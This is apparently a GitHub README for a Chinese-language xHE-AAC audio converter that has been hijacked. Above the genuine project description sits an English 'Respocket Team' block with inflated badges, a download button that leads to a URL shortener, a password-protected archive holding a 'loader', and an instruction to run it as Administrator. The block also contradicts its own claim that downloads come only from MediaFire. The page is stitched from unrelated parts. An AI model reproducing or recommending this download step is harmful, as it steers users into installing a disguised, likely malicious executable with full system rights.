<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# xHE Converter for BMDC

批量转换 Blackmagic Camera (Android) 录制的 **xHE-AAC / USAC** 音频为剪辑软件
（Premiere Pro 等）可直接使用的格式。Gradio 本地网页界面，Windows / macOS 双平台。

## 功能

- 拖入/多选/粘贴路径导入（可多次），自动探测并以 **xHE 徽标自动选中** xHE 文件
- 音频参数对齐 HandBrake 全集：AAC / HE-AAC / MP3 / Vorbis / Opus / AC-3 / E-AC-3 /
  FLAC 16/24 / ALAC 16/24 / Passthru / Auto Passthru；采样率、位深、码率、声道、增益
- 容器：MP4 / M4V / MKV / WebM（按容器校验编码器兼容性）
- 视频流默认无损复制；可选 H.264/H.265/AV1/VP9 重编码
- **硬件加速**：启动时探测 NVENC / AMF / QSV / VideoToolbox 实际可用性（动态兼容所有版本/代次）
- 批量重命名面板（输出文件名）、全局 FFmpeg 参数透传（冲突告警）
- 每文件进度、日志选项卡、失败重试、失败不影响其他文件
- 多项目并行导出、队列级断点恢复（重启后未完成任务回到队列）
- 输出文件名冲突自动 `_1`/`_2` 去重；`.partial` 原子提交 + 输出验证
- 预设：一键保存/加载全部转码配置

## 运行（开发）

```bash
uv venv --python 3.14 .venv
uv pip install --python .venv/Scripts/python.exe -e .[dev]   # macOS/Linux: .venv/bin/python
## 版本

- **Lite**：zip 包，使用本机已有 FFmpeg；`dependencies.yaml` 指定路径
- **Onekey**：安装器（Windows Inno Setup EXE / macOS dmg），内置 Python 运行时、
  FFmpeg portable 与 xaacdec，安装后开箱即用

每周日 0 点（北京时间）GitHub Actions 自动拉取最新稳定 FFmpeg 与依赖构建
Auto-Release。

## 许可证

GPL-3.0（见 LICENSE）。捆绑的 FFmpeg 为 GPL 构建；xaacdec 来自 AOSP libxaac
(Apache-2.0)。各发行版附带完整第三方许可清单。


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
